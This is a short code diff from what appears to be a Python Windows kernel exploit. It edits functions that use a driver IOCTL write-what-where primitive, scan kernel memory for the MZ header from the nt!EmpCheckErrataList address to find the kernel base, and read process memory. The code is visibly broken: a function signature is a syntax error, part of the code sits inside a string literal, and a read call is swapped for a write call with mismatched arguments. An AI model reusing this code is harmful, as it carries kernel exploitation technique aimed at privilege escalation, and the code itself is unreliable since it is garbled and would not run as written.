@@ -93,10 +93,6 @@ def writeQWORD(driver, what=None, where=None):
     print "Value after: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
     return triggerIOCTL
 
-
-
-
-
 '''
 ThreadHandle = kernel32.GetCurrentThread()
 ThreadInformation = THREAD_BASIC_INFORMATION()
@@ -120,7 +116,7 @@ signature = 0x00905a4d
 searchAddr = nt_EmpCheckErrataList.value & 0xFFFFFFFFFFFFF000
 
 while True: 
-	readData = leakQWORD(searchAddr, driver)
+	readData = writeQWORD(searchAddr, driver)
 	tmp = readData.value & 0xFFFFFFFF
 	if tmp == signature: 
 		baseAddr = searchAddr
@@ -133,16 +129,6 @@ while True:
 	print("W32THREAD address is: 0x%x" % W32THREAD.value)
 	print("nt!EmpCheckErrataList address is: 0x%x" % nt_EmpCheckErrataList.value)
 	return baseAddr
-
-def readWhatWhere(driver=none, Where=)
-lpBuffer = c_ulonglong()				#where - change this!
-result = kernel32.ReadProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a001010, byref(lpBuffer), 0x08, byref(read))
-	if result == 0:
-		print("Something went wrong while reading memory","e")
-		sys.exit()
-	return lpBuffer				#address needs to match the above
-	print "LPBuffer Contained: %08x" % cast(0x000000001a001010, POINTER(c_ulonglong))[0]
-
 
 '''
 
